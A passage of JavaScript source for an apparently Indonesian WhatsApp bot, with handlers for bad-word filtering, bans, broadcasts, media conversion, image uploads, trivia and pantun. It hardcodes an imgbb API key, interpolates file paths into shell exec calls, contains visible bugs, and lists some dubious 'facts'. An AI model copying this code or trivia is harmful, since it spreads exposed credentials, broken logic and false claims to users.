										bi += `\nTotal : ${badword.length}`
									reply(bi)
									break
						case 'addbadword':
									if (!isOwner && !Ofc.key.fromMe)return reply(mess.only.owner) 
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										if (isKasar(args[0].toLowerCase(), badword)) return reply(`Cari nama lain Lord`)
										addBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (isKasar(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Udah ada`)
											addBadword(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									break
						case 'delbadword':{
									if (!isOwner && !Ofc.key.fromMe)return reply(mess.only.owner) 
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										if (!isKasar(args[0].toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
										delBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (!isKasar(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
											delBadword(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									}
									break
						case 'clearbadword':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!m.quoted) return reply(`Reply Pesan Target!`)
									entah = Ofc.message.extendedTextMessage.contextInfo.participant
									delCountKasar(entah, senbadword)
									reply(`Sukses clear badword ${entah}`)
									break
						case 'antitroli': case 'antifaketroli':{
									try {
										if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)
										if (args[0].toLowerCase() === 'on'){
											if (isAntro) return reply(`Sudah Di Aktifkan Sebelumnya!`)
											atro.push(from)
											fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
											reply(`Succes mengaktifkan Fitur Anti-Troli`)
											} else if (args[0].toLowerCase() === 'off'){
												if (!isAntro) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
												var ou = atro.indexOf(from)
												atro.splice(ou, 1)
												fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
												reply(`Succes Mematikan Fitur Anti-Troli`)
												}
											} catch {
												}
											}
									break
						case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
									var p = await Zeeone.getStatus(`${sender}`, MessageType.text)
									let cek = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
									Zeeone.sendMessage(from, pp_userz, image, {thumbnail:pp_userz, caption:` * USER PROFILE*

📛 Nama : ${pushname==undefined?sender.split("@")[0]:pushname}
🎯 Bio : ${p.status==undefined?`Not Found`:p.status}
💬 Tag : @${sender.split("@")[0]}
🆔 Api : wa.me/${sender.split("@")[0]}

⬣ Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
⬣ Balance : ${getBalance(sender, balance)}
⬣ Role : ${role}
⬣ Level : ${getLevelingLevel(sender)}
⬣ Xp : ${getLevelingXp(sender)}
⬣ Status : ${isOwner?`Owner`:isPremium?`Premium User
⬣ Expired Prem : ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`:isUser?`Free User`:`Belum Daftar`}
⬣ Baned : ${isBanned?`Terbanned`:`Tidak Terbanned`}`, quoted: Ofc, contextInfo:{mentionedJid:[sender]}})
									}
									break
						case 'listonline': case 'listaktif':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
									let online = [...Object.keys(Zeeone.chats.get(ido).presences), Zeeone.user.jid]
									Zeeone.sendMessage(from, '*List Online :*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
										quoted: fakevideo,
										contextInfo: { mentionedJid: online }
										})
									break
							case 'infogc': case 'groupinfo': case 'infogrup': case 'grupinfo':
							console.log('eror bang fix sendiri')
									if (!isGroup) return reply(mess.only.group)
									try {
										ppUrl = await Zeeone.getProfilePicture(groupMetadata.jid)
											} catch {
												ppUrl = `${imagebb}`
												}
												let cekviip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
												let nya = `*G R O U P - I N F O*

📛 Nama : ${groupName}
👤 Owner Grup : ${groupMetadata.owner}
👥 Total Member : ${groupMembers.length}
👥 Total Admin : ${groupAdmins.length}
 
⬣ Welcome : ${isWelkom ? 'On':'Off'}
⬣ Anti Link : ${isAntiLink? 'On':'Off'}
⬣ Anti Badword : ${isBadword? 'On':'Off'}
⬣ Anti Fake Troli : ${isAntro? 'On':'Off'} ${isSewa?`
⬣ Expired Sewa : ${cekviip.days} Hari, ${cekviip.hours} Jam, ${cekviip.minutes} Menit, ${cekviip.seconds} Detik*`:``}
  
💬 Deskripsi Group :
\`\`\`${groupDesc}\`\`\``
									var jk = await getBuffer(thumbnail)
									Zeeone.sendMessage(from, jk, MessageType.image, {thumbnail: thumbnail, caption: nya, quoted: Ofc})
									break
						case 'caripesan': case 'searchmessage':
									if (!Ofc.key.fromMe && !isPremium) return reply(mess.only.prem)
									if(!q)return reply('Pesannya apa Lord?')
									reply('Otw Lord')
									let v = await Zeeone.searchMessages(q,from,10,1)
									let s = v.messages
									let el = s.filter(v => v.message)
									el.shift()
									try {
										if(el[0].message.conversation == undefined) return
										reply(`Ditemukan ${el.length} pesan`)
										await sleep(3000)
										for(let i = 0; i < el.length; i++) {
											await Zeeone.sendMessage(from,'Nih Pesannya',text,{quoted:el[i]})
											}
										} catch(e){
											reply('Pesan tidak ditemukan!')
											} 
									break
						case 'tomp3': case 'tomusic': case 'toaudio':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedVideo) return reply(`Reply video nya lord`)
									reply(mess.wait)
									var encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									var media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									var ran = getRandom('.mp4')
									exec(`ffmpeg -i ${media} ${ran}`, (err) => {
										fs.unlinkSync(media)
										if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
										var buffer = fs.readFileSync(ran)
										Zeeone.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: Ofc})
										fs.unlinkSync(ran)
										})
									limitAdd(sender, limit)
									break
						case 'toptt': case 'tovn':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedAudio) return reply(`Reply Audionya Lord`)
									reply(mess.wait)
									var encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									var media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									var ran = getRandom('.mp4')
									exec(`ffmpeg -i ${media} ${ran}`, (err) => {
										fs.unlinkSync(media)
										if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
										var buffer = fs.readFileSync(ran)
										Zeeone.sendMessage(from, buffer, audio, {ptt: true, mimetype: 'audio/mp4', quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'toimg': 
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									reply(mess.wait)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									if ((isMedia && !Ofc.message.videoMessage || isQuotedImage || isQuotedSticker && args.length == 0)) {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.png')
										exec(`ffmpeg -i ${media} ${ran}`, (err) => {
											fs.unlinkSync(media)
											if (err) return reply('❎ Gagal, pada saat mengkonversi sticker ke gambar ❎')
											buffer = fs.readFileSync(ran)
											Zeeone.sendMessage(from, buffer, image, {thumbnail : thumbnail, caption:'Sukses Lord',quoted:Ofc})
											fs.unlinkSync(ran)
											})
										} else {
											reply(`Reply Stiker Nya Lord`)
										}
										limitAdd(sender, limit)
									break
						case 'togif':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									reply(mess.wait)
									if (Ofc.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									moew = await webp2gifFile(media)
									console.log(moew)
									Frd = await getBuffer(moew.result)
									Zeeone.sendMessage(from, Frd, video, { mimetype: 'video/gif', caption: 'Sukses Lord', quoted: Ofc })
									limitAdd(sender, limit)
									break
						case 'tovideo': case 'tomp4':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedSticker) return reply('Reply stiker gif lord')
									reply(mess.wait)
									if ((isMedia && !Ofc.message.videoMessage || isQuotedSticker) && args.length == 0) {
										ger = isQuotedSticker ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
										webp2mp4File(owgi).then(res=>{
											Zeeone.sendMessage(from, res.result, video, { mimetype: Mimetype.mp4, filename: 'tovideo.mp4',caption: 'Sukses Lord', quoted: Ofc})
											})
										}else {
											reply('reply stiker')
										}
									fs.unlinkSync(owgi)
									limitAdd(sender, limit)
									break
						case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
									var imgbb = require('imgbb-uploader')
									if (isQuotedAudio) {
										ger = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										reply(mess.wait)
										owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
										Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
										teks=`─ 「 *AUDIO TO URL* 」 ─

*🔖 Url : ${Okelor.display_url}*`
										reply(teks)
 
										} else if (isQuotedImage) {
											ger = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Ofc
											reply(mess.wait)
											owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
											qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
											teks=`─ 「 *IMAGE TO URL* 」 ─

*🔖Url : ${qbc.display_url}*`
											reply(teks)
											} else if (isQuotedVideo) {
												ger = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Ofc
												reply(mess.wait)
												owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
												ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
												teks=`─ 「 *VIDEO TO URL* 」 ─

*🔖 Url : ${ffff.display_url}*`
												reply(teks)
												} else if (isQuotedSticker) {
													ger = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
													reply(mess.wait)
													owgi = await Zeeone.downloadAndSaveMediaMessage(ger)
													vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
													teks=`─ 「 *STICKER TO URL* 」 ─

*🔖 Url : ${vrr.display_url}*`
													reply(teks)
												}
											break
						case 'q': case 'ulang':
									if (!m.quoted) return reply('reply pesan!')
									var jpio = Zeeone.serializeM(await m.getQuotedObj())
									if (!jpio.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
									await jpio.quoted.copyNForward(m.chat, true)
									break
						case 'block':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@c.us`
										Zeeone.blockUser (`${ny}@c.us`, "add")
										reply(`Nomor ${ny} telah di blockir!`)
										} else {
											ny = `${mentionUser}`
											Zeeone.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "add")
											reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah blockir!`)
											}
									break
						case 'unblock':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@c.us`
										Zeeone.blockUser (`${ny}@c.us`, "remove")
										reply(`Nomor ${ny} telah di unblockir!`)
										} else {
											ny = `${mentionUser}`
											Zeeone.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "remove")
											reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah dibanned!`)
										}
										limitAdd(sender, limit)
									break
						case 'ban':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@s.whatsapp.net`
										ban.push(ny)
										fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
										reply(`Nomor ${ny} telah dibanned!`)
										} else {
											ny = `${mentionUser}`
											ban.push(ny)
											fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
											reply(`Nomor ${ny} telah dibanned!`)
										}
										limitAdd(sender, limit)
									break
						case 'unban':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ah = `${args[0].replace("@","")}@s.whatsapp.net`
										unb = ban.indexOf(ah)
										ban.splice(unb, 1)
										fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
										reply(`Nomor ${ah} telah di unban!`)
										} else {
											ah = `${mentionUser}`
											unb = ban.indexOf(ah)
											ban.splice(unb, 1)
											fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
											reply(`Nomor ${ah} telah di unban!`)
										}
										limitAdd(sender, limit)
									break
						case 'resetlimit':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									Zeeone.updatePresence(from, Presence.avaible)
									fs.writeFileSync('./database/limit.json', ('[]'))
									reply('Sukses Lord')
									await sleep(5000)
									limitAdd(sender, limit)
									break
						case 'bc': case 'broadcast':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner) 
									if (args.length < 1) return reply(`${prefix + command} Alphabot`)
									anjir = await Zeeone.chats.all()
									if (isMedia && !Ofc.message.videoMessage || isQuotedImage) {
									const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
									buff = await Zeeone.downloadMediaMessage(encmedia)
									for (let _ of anu) {
									await Zeeone.sendMessage(_.jid, buff, image, { caption: `${q}`})
									reply(`Sukses mengirim Broadcast`)
									}
									} else {
									for (let _ of anjir) {
										await Zeeone.sendMessage(`${_.jid}`, '*BROADCAST*' + '\n\n' + q, text, {quoted: ftroli})
										reply('Sukses Lord')
										}
									}
									limitAdd(sender, limit)
									break
						case 'tobc':
				if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner) 
				anu = await Zeeone.chats.all()
					if (isMedia && !Ofc.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
						buff = await Ofc.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Ofc.sendMessage(_.jid, buff, audio, { quoted: Ofc })
						}
						} else if (isMedia && !Ofc.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
						buff = await Zeeone.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Zeeone.sendMessage(_.jid, buff, sticker, { quoted: Ofc, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
						case 'faktaunik':{
									const faktau = ["Negara Indonesia berada di posisi ke-4 sebagai Negara Terindah di Dunia versi situs First Choice.","Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang.","AS, Australia, Finlandia, Jerman dan Kanada adl negara maju tanpa UN. Tahukah anda sekolah trbaik di dunia ada di Finlandia walau tanpa UN.","","\"Jengkol is very nice\" komentar Pierre Bouvier vokalis Simple Plan.","Tiap satu kali jari kita mengklik mouse komputer, ada 1,42 kalori yang terbakar dalam tubuh. (Penelitian, Convert Anything to Calories).","Di Jepang kuno, prajurit diolesi minyak kodok pada tubuh mereka dengan keyakinan bahwa hal itu akan membuat tubuh mereka antirobek."," Di Jepang, ketiduran saat bekerja (inemuri) dapat ditolerir, karena dipandang sebagai kelelahan yang muncul akibat bekerja terlalu keras.","Gergaji mekanik awalnya diciptakan sebagai alat kedokteran untuk membantu melahirkan bayi.","Jangan sering mengatakan kata  di Australia dan Selandia Baru. Di sana, kata berarti mengajak untuk melakukan hubungan seks.","Jamur merang Laetiporus dikenal sebagai julukan \"ayam hutan\" karena konon rasanya mirip seperti daging ayam goreng.","Kaki katak merupakan hidangan istimewa di eropa. Tahukah Anda: sekitar 80% impor katak Eropa berasal dari Indonesia.","Jika Anda mengetik \"do the harlem shake\" di search bar YouTube, layar akan melakukan Harlem Shake!. [Google Chrome]","Melihat melalui lubang kecil akan segera meningkatkan penglihatan Anda sementara.","YouTube menyebutkan rata-rata ada 4000 video baru Harlem Shake yang diunggah setiap hari. [Yahoo!]","Semut memiliki kuburan sendiri. Tapi tahukah anda: Gurita memiliki kebun dan suka berkebun. (wikipedia)","Coklat mengandung Theobromine, molekul organik yang dapat membantu menguatkan enamel gigi. (Penelitian dari Tulane University).","Wanita 2 kali lebih banyak menggunakan emoticon dalam pesan teks dibandingkan pria. (Penelitian di Rice University)","Biarpun Buzz Aldrin adalah orang kedua yang menginjak di bulan tetapi ia adalah orang pertama yang membuang kotoran di ruang angkasa.","Fakta unik berikutnya adalah, Psikolog mengatakan bahwa mengirim dan menerima pesan teks benar-benar dapat meningkatkan mood Anda ketika Anda merasa kesepian. (Telegraph)","Thailand merupakan satu-satunya negara di Asia Tenggara yang tidak pernah dijajah.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. (cracked .com)"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. (BBCnews)","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Semakin pahit cokelat (tinggi zat theobromine), semakin tinggi manfaatnya. Rajin mengkonsumsi 1bar cokelat/hari dapat menyembuhkan batuk kronis.","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".","Tidur Siang (Power Nap) trbukti menambah tinggi badan, dikrnkan saat kita tidur siang hormon pertumbuhan (Growth Hormone) lbh aktif bekerja.","Bilangan prima terbesar di dunia saat ini panjangnya 17 juta digit angka, cukup banyak untuk mengisi 28 lembar halaman pada buku novel.","Menurut sebuah studi, minum teh hijau setelah makan ikan membantu menghalangi zat Mercury yang terkandung dalam ikan memasuki aliran darah."," Memperpanjang usia handphone hingga 4 tahun dapat mengurangi dampak lingkungan sampai 40 persen. [Hasil studi di Swiss]","Duduk bersama dgn teman-teman / keluarga utk makan bersama, dpt meningkatkan kebahagiaan & membantu meringankan depresi. [ehealthnewsdaily]","Abibliophobia adalah fobia atau ketakutan terhadap kehabisan bahan bacaan.","Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai \"emas putih\".","Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]","Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]","","35. Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]","Menurut penelitian baru, usia harapan hidup anak band rata-rata lebih tinggi dibandingkan musisi yang memilih solo karir. (detikHealth)","Pulau Dewata Bali merupakan 1 dari 10 pulau paling romantis di dunia. [majalah Travel+Leisure]","Universitas di Jepang selalu melakukan upacara peringatan bagi hewan (contoh: tikus) yang mati dalam pengujian laboratorium. [web.archive .org]","Berkedip memberikan otak Anda istirahat sebentar. [para ilmuan di Japan’s Osaka University]","Wanita yang bahagia dalam sebuah pernikahan akan mengalami berat badan naik setengah pound (0,22 kg) setiap 6 bulan. [DailyMail]","Rasa cemburu berlebihan bisa digolongkan penyakit jiwa, krna dpt mendorong ssorg utk bunuh diri / menghabisi nyawa org lain. [riset]","","Mengkonsumsi buah tomat beberapa kali dlm kurun waktu seminggu dpt mengatasi perasaan depresi. [peneliti di Tianjin Medical Univ., Cina]"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. [BBCnews]","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan","kecemasan, bahkn dpt meningkatkan memori. [Dailymail]","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]","Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia.","Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. (Penelitian di Inggris)","Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka.","Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]","Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.","Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30 . [studi baru dari St Tropez]Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang. (detikHealth)","Nama \"Gorila\" berasal dari kata Yunani \"Gorillai\" yang berarti \"perempuan berbulu\".","IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.","Selama abad ke-13, kata \"nice\" sebenarnya berarti “stupid”, \"senseless\" dan “foolish\".","59. 49% dari pemilik Smartphone adalah jomblo. (Survei, \"2012 Online User Behavior and Engagement Study\")","Fakta Unik","60. Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)","Lalat dapat menyalurkan sekitar 300 bakteri setiap kali hinggap di benda.","Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.","Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri."," Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)","Apel yang ditaruh di ruang terbuka akan matang 10 kali lebih cepat dibandingkan dengan apel yang ditaruh di kulkas.","Ungkapan 'Smitten' adalah untuk menyebut 'naksir' dalam bahasa Inggris.","Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang.","Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan."," \"Mwahahaha\" dan \"lolz\" telah ditambahkan ke Kamus Inggris Oxford.","Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.","Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut \"Barbe á Papa\" yang berarti \"Jenggot Ayah\".","Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah.","Hangry adalah penggabungan kata dari \"Hungry\" dan \"Angry\", di pakai ketika anda sedang lapar dan marah.","Kentut dari bakteri membuat keju swiss memiliki lubang-lubang.","Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)","Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)","Melamun dpt memendekkan telomere (bagian paling ujung sel DNA) yang berperan dlm menjaga kestabilan sel, dimana dapat mempercepat proses penuaan."]
									const ran_faktau = faktau[Math.floor(Math.random() * faktau.length)]
									reply(`*Fakta Unik :*\n${ran_faktau}`)
									}
									break
						case 'pantun':{
									const pantun = ["\nAnak tikus rindu ibunya\n\nsombong nich ceritanya","\nAda kepompong ada kupu\n\nbales donk sms dari aku","\nBeli bandeng\n\ndi Malaysia\n\ngue ganteng\n\nkayak Pasha","\nHati siapa tak bimbang\n\nsitu botak minta dikepang","\nBuah semangka\n\nbuah duren\n\nnggak nyangka\n\ngue keren\n ","\n Mawar bersemi\n\ndi batang kayu\n\ndo you love me\n\nlike i love you","\nBurung perkutut\n\nburung kuthilang\n\nkamu kentut\n\nenggak bilang bilang","\nBread is roti\n\nshadow is bayang\n\nbefore you mati\n\nbetter you sembahyang","\nJangan takut\n\njangan khawatir\n\nitu kentut\n\nbukan petir","\nBeli ikan di pasar malam\n\ndasar bego ni kawan","\nMakan duren sambil ngelamun,\n\nHati-hati ketelen ntar bijinya","\nDi  sana gunung, di sini gunung\n\nCiptaan Tuhan deh","\nKan bandeng\n\nmakan kawat\n\norang ganteng\n\nnumpang lewat","\nOrang ganteng\n\nsuka sama si Rini\n\ngak seneng\n\nmaju sini","\nMelon manis di air es\n\nke mana aja lo gak pernah sms","\nJambu merah\n\ndi dinding\n\njangan marah\n\njust kidding","\nBuah semangka\n\nbuah manggis\n\nnggak nyangka\n\ngue manis","\nMen sana\n\nin corpore sano\n\ngue maen ke sana,\n\nelo maen ke sono!","\nBuah apel\n\ndi air payau\n\nnggak level\n\nlayauuuuuuu","\nDi sini bingung, di sana linglung\n\nemangnya enak, enggak nyambung…","\nBuah semangka berdaun sirih\n\nBuah ajaib kali yah","\nPilih suara harpa yang jelas.\n\nTali di harpa diikat cinta","\nCiuman di pipi\n\nciuman di dahi\n\nApa yang dicium sesudah lah cinta?","\nSepandai-pandai tupai melompat\n\nPolisi lebih pandai melompat","\nDua tiga kacang tanah\n\nenggak ada pacar yang datang ke rumah","\nDapet kado isinya tomat\n\nBodo amat!!","\nDulu delman, sekarang gokar\n\ndulu teman, sekarang pacar","\nStroberi mangga apel\n\nsorry gak level","\nBola pingpong dimakan gelatik\n\nBiar ompong yang penting cantik\n","\nMata belo,\n\nala komedian.\n\ngue sama elo?\n\nmaunya jadian.","\nTunda lapar,\n\nmakan indomi.\n\nhati menggelepar,\n\ncintapun bersemi.","\nPotong kuku,\n\npendek-pendek.\n\nhatiku beku,\n\nsi abang mendadak ngondek.","\nBeli ketan,\n\nbeli kain songket.\n\nbiar udah mantan,\n\nkita tetep lengket.","\nKe pasar, nyari obat gatal\n\nDasar, gak modal!","\nMakan semangka,\n\nmakan kedondong.\n\nkalau suka,\n\nnyatain dong.","\nGa punya pendirian,\n\nbikin jemu.\n\nga mau sendirian,\n\nmaunya bobo sama kamu.","\nNembak itik,\n\nlangsung kena.\n\nkamu cantik,\n\nhey nona!","\nKotak amal,\n\ndigoyang-goyang.\n\nkemarin aku diramal,\n\njodohnya sama abang.","\nHari Jumat,\n\npada pake batik.\n\nsalam hormat,\n\nbuat neng cantik.","\nPecahan genting,\n\ndi bawah kursi.\n\nbetah meeting,\n\nkarena si boss seksi.","\nNangis-nangis,\n\nmobil kena srempet.\n\nneng manis,\n\nmau dong dipepet.","\nPanasin mentega,\n\nkarena mulai beku.\n\nkamu mau ga,\n\njadi imamku?","\nPotong sebahu,\n\nbiar ga sendu.\n\nkamu tahu?\n\nAku rindu.","\nJangan tanya,\n\nkapan lulus kuliah.\n\nga dapet anaknya,\n\nmamanya boleh lah","\nBikin anak,\n\ndi pojokan sekolah\n\nkalau mau enak,\n\nnikah dulu lah.","\nMain mata,\n\nmesem-mesem.\n\nneng tetep cinta,\n\nbiarpun abang keteknya asem.","\nTiduran di tandu,\n\nberjam-jam.\n\nhati merindu,\n\nmata sulit memejam.","\nUbek-ubek peti,\n\ncari gunting.\n\nsaking cinta mati,\n\nneng rela bunting.","\nNamanya penjahat,\n\npolisi jadi inceran.\n\nbosan jadi temen curhat,\n\nmaunya pacaran.","\nKe salon creambath,\n\nbiar aliran darah lancar.\n\nbosen ah jadi sahabat,\n\nmaunya jadi pacar!"]
									const ran_pantun = pantun[Math.floor(Math.random() * pantun.length)]
									reply(`*Pantun :* \n${ran_pantun}`)
									}
									limitAdd(sender, limit)
									break
						case 'dare':
